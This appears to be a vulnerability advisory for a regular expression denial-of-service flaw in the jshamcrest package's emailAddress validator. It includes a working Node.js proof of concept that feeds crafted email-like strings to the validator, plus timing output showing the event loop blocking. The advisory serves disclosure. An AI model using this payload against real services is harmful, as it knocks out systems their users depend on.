  title: Regular Expression Denial of Service
  description: |-
    The `jshamcrest` package is affected by a regular expression denial of service vulnerability when certain types of user input are passed in to the emailAddress validator.


    ## Proof of concept

    ```
    var js = require('jshamcrest')
    var emailAddress = new js.JsHamcrest.Matchers.emailAddress();


    var genstr = function (len, chr) {
        var result = "";
        for (i=0; i<=len; i++) {
            result = result + chr;
        }

        return result;
    }


    for (i=1;i<=10000000;i=i+1) {
        console.log("COUNT: " + i);
        var str = '66666666666666666666666666666@ffffffffffffffffffffffffffffffff.' + genstr(i, 'a') + '{'
        console.log("LENGTH: " + str.length);
        var start = process.hrtime();
        emailAddress.matches(str)

        var end = process.hrtime(start);
        console.log(end);
    }
    ```

    ### Results
    It takes about 116 characters to get a 1.6 second event loop block.
    ```
    [ 1, 633084590 ]
    COUNT: 51
    LENGTH: 116
    ```

    \n\"The Regular expression Denial of Service (ReDoS) is a Denial of
    Service attack, that exploits the fact that most Regular Expression
    implementations may reach extreme situations that cause them to work
    very slowly (exponentially related to input size). An attacker can then
    cause a program using a Regular Expression to enter these extreme
    situations and then hang for a very long time.\" \[1\]
